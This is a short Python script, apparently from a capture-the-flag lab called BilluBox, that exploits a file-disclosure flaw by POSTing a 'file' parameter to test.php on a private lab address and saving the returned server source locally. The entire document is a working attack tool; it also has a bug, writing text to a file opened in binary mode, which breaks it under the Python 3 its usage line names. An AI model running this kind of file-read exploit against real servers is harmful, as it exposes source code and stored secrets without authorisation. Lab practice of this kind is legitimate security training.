#!/usr/bin/python
HELP = '''
Name: get_source.py
Purpose: Get the source of a page from the BilluBox challenge
Usage: python3 get_source.py <path_to_page>
'''


import requests
import sys

BASE_URL = 'http://192.168.80.128/'
DOWNLOAD_PAGE = BASE_URL + 'test.php'


def get_source(page_name, save_to_file=False):
	'''
	Download the source of a file from the site
	:param str page_name: The relative path to the page we want to get the source to.
	'''
	print('[*] Downloading the page {}'.format(BASE_URL + page_name))
	response = requests.post(DOWNLOAD_PAGE, data = {'file': page_name})
	with open(page_name, 'wb') as f:
		f.write(response.text)

def main():
	'''
	The program's main function
	'''
	if len(sys.argv) != 2:
		exit(HELP)
	target_page = sys.argv[1]
	get_source(target_page)

if __name__ == '__main__':
	main()
